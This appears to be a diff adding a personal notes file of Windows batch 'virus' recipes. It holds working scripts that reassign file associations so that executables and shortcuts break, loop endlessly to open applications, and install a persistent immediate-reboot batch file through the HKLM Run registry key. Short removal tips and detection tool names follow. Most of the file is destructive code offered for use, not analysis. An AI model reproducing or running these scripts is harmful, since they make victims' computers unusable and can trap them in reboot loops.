@@ -1,0 +1,53 @@
+*toolkit-Dump
+
+
+VIRUS WRITING:
+Batch programming-lang. to create virus
+save with .bat
+
+2nd virus:
+@echo off
+assoc .exe=hacked
+
+assoc .exe=exefile to resolve it
+
+to make it permt.
+assoc .exe=hacked
+assoc .bat=hacked
+assoc .dll=hacked
+assoc .mp3=hacked
+assoc .com=hacked
+assoc .msi=hacked
+assoc .lnk=hacked
+assoc
+
+3 rd virus:
+@echo off
+:hell
+start notepad.exe
+start calc.exe
+start spider.exe
+start mspaint.exe
+msg * Stop me if you can!
+Goto hell
+
+4th virus:
+@echo off
+echo @echo off > c:\windows\system32\cmdd.bat
+echo shutdown.exe -r -t 00 >> c:\windows\system32\cmdd.bat
+reg add HKLM\SOFTWARE\Microsoft\windows\currentversion\Run /v drivers /t REG_SZ /d
+c:\windows\system32\cmdd.bat /f
+
+to delete the virus
+go to safe mode>run>msconfig>startup>driver>unmark it
+ 
+tool to remove virus:
+process explorer
+TCP view
+KLDETECT:KEY LOGGER DETECT
+
+
+
+
+
+
